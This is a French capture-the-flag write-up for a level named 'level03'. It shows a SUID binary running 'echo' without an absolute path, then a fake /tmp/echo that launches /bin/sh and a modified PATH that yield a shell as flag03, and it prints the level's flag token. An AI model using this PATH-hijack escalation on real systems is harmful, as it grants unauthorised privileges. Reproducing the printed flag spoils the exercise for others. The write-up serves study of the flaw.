# level03

## Contexte

On trouve un fichier exécutable `level03` dans le home de `level03`.

## Recherche

On regarde les permissions du fichier :

```bash
ls -l level03
```

On remarque que le binaire appartient à `flag03` et possède le bit **SUID** activé.

Cela signifie que le programme sera exécuté avec les droits de son propriétaire, donc avec les droits de `flag03`.

On analyse le binaire avec `strace` pour voir quelles commandes il exécute :

```bash
strace -f ./level03 2>&1 | grep 'execve'
```

On remarque qu'il utilise la commande `echo`.

## Vulnérabilité

Le problème vient de l'utilisation de `echo` sans chemin absolu.

Le programme utilise la variable d'environnement `PATH` pour trouver la commande à exécuter. Il est donc possible de remplacer `echo` par un autre programme en modifiant le `PATH`.

Comme le binaire est SUID, notre commande sera exécutée avec les droits de `flag03`.

## Exploitation

On crée un faux `echo` qui exécutera un shell :

```bash
echo '/bin/sh' > /tmp/echo
chmod +x /tmp/echo
```

On modifie ensuite le `PATH` pour utiliser notre faux `echo` :

```bash
export PATH=/tmp:$PATH
```

On lance le programme :

```bash
./level03
```

On obtient un shell avec les droits de `flag03`, puis on récupère le flag avec `getflag` :

```text
qi0maab88jeaj46qoumi7maus
```

## Ressources

- SUID
- Variables d'environnement
- `PATH`